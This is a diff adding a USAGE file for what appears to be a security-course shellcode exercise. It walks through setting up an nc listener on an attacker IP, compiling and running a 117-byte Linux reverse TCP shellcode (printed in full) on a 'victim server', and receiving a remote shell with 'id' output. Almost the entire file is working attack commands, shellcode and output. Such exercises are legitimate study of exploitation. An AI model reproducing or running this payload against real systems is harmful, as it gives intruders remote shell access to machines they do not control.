@@ -1,0 +1,35 @@
+USAGE
+
+1. attacker has 192.168.1.149 IP and runs nc to listen on 55005 port
+
+attacker $ nc -vl 55005
+[do not close it]
+
+
+2. Running shellcode a victim server
+exam2$ ./compile_all.sh shell_reverse_tcp 192.168.1.149 55005
+ [I] Using custom port: 55005
+ [+] Assembling shell_reverse_tcp.nasm with NASM ...
+ [+] Linking shell_reverse_tcp.o ...
+ [+] Generating shellcode with objdump ...
+ [+] Checking shellcode for NULLs ...
+ [+] Shellcode size is 117 bytes
+"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xeb\x51\x5f\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xd2\xff\x37\x66\xff\x77\x04\x4b\x66\x53\x43\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xd8\x31\xc0\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xcd\x80\xe8\xaa\xff\xff\xff\xc0\xa8\x01\x95\xd6\xdd"
+ [+] Generating shellcode.c file with the shell_reverse_tcp shellcode ...
+ [+] Compiling shellcode.c with GCC ...
+ [+] All done! You can run the shellcode now: 
+$ ./shellcode
+
+exam2$ ./shellcode 
+Shellcode Length:  117
+
+
+3. Checking now your nc
+attacker $ nc -vl 55005
+Connection from 192.168.1.149 port 55005 [tcp/*] accepted
+id
+uid=500(arno) gid=500(arno) groups=500(arno),18(dialout),498(desktop_admin_r),501(vboxusers) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+
+Voila ! We've got a shell to a victim server.
+
